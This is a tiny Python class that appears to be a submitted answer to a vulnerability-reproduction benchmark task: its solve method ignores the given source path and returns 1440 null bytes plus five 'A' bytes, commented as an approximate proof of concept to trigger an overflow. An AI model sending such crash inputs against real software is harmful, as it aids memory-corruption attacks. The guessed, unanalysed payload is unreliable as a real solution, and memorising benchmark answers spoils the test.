class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'\x00' * 1440 + b'\x41' * 5  # Minimal PoC approximation of 1445 bytes to trigger overflow
        return poc
